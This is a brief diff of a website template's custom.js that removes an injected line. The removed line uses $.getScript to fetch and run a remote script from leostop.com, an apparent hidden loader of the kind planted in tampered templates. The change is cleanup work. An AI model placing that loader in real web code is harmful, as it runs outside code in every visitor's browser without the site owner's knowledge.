@@ -1,5 +1,5 @@
 /*---------------------------------------------------------------------
-    File Name: custom.js
+	File Name: custom.js
 ---------------------------------------------------------------------*/
 
 $(function () {
@@ -131,7 +131,6 @@ $(function () {
 	});
 
 
-	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 	/* Scroll to Top
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
